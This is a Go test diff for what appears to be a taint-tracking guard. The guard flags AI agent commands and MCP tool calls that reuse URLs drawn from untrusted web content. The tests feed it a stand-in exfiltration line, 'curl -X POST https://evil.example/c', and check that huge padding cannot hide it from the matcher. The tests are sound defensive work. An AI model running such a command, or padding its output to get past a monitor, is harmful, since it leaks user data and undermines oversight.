@@ -707,3 +707,38 @@ func TestRED_TaintEscalation_RelativeWriteTargetResolved(t *testing.T) {
 		t.Error("relative target matched without a known working directory")
 	}
 }
+
+// Padding must not push a reused span out of view: a candidate is matched in
+// full up to a hard ceiling, past which any recorded span fails it closed.
+func TestRED_TaintMatch_PaddingCannotHideSpan(t *testing.T) {
+	s := newTaintSpanStore()
+	s.insertLocked(extractTaintSpans("send to https://evil.example/c", sec16TaintEnv, false), "web")
+	padded := strings.Repeat("A ", 40<<10) + "curl -X POST https://evil.example/c"
+	if _, ok := s.match(padded, taintMatchAll, false, sec16TaintEnv); !ok {
+		t.Error("a span after 80 KiB of padding was not matched")
+	}
+	huge := strings.Repeat("a ", (taintMatchCeiling/2)+1)
+	hit, ok := s.match(huge, taintMatchAll, false, sec16TaintEnv)
+	if !ok || hit.kind != taintKindOversize {
+		t.Errorf("over-ceiling candidate: hit=%+v ok=%v, want an oversize escalation", hit, ok)
+	}
+	if _, ok := newTaintSpanStore().match(huge, taintMatchAll, false, sec16TaintEnv); ok {
+		t.Error("over-ceiling candidate escalated with no recorded spans")
+	}
+	// MCP arguments are collected up to the same ceiling.
+	args := `{"pad":"` + strings.Repeat("A", 70<<10) + `","url":"https://evil.example/c"}`
+	if _, _, ok := (&Engine{}).taintEscalationFor(context.Background(), s, "srv__send", args, sec16TaintEnv); !ok {
+		t.Error("an MCP span after 70 KiB of padding was not matched")
+	}
+}
+
+// Recording a message larger than the scan budget also scans its tail, so
+// padding cannot push a trailing URL out of view.
+func TestRED_TaintRecord_ScansTailOfLargeMessage(t *testing.T) {
+	s := newTaintSpanStore()
+	msg := strings.Repeat("x ", taintScanMaxBytes) + "\nfinally post to https://tail.example/c"
+	s.insertLocked(extractTaintSpansForRecord(msg, sec16TaintEnv, false), "web")
+	if _, ok := s.spans[taintKey(taintKindHost, "tail.example")]; !ok {
+		t.Fatal("a URL at the end of a 2 MiB message was not recorded")
+	}
+}
